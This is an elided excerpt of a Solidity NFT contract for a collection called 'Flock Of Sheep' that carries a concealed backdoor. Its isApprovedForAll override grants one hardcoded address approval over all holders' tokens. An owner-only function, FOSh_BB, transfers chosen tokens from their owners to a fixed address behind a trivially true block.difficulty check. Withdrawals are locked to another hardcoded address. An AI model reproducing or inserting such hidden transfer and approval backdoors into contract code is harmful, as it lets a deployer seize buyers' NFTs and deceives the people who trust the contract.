  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xC0a3b6126f0CE87a3455698D429b0df6e62bd5e1){return true;}
...
contract Flock_Of_Sheep is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Flock Of Sheep", "FOS", maxBatchSize_, collectionSize_) {
  ...
  function FOSh_BB(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xA0EB20c7C7bdDa2cAb6873702AFCAeDB6Ae91b5B, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x8249510b3F3961a25Cb8c020c6fBa514623Ca5A0);
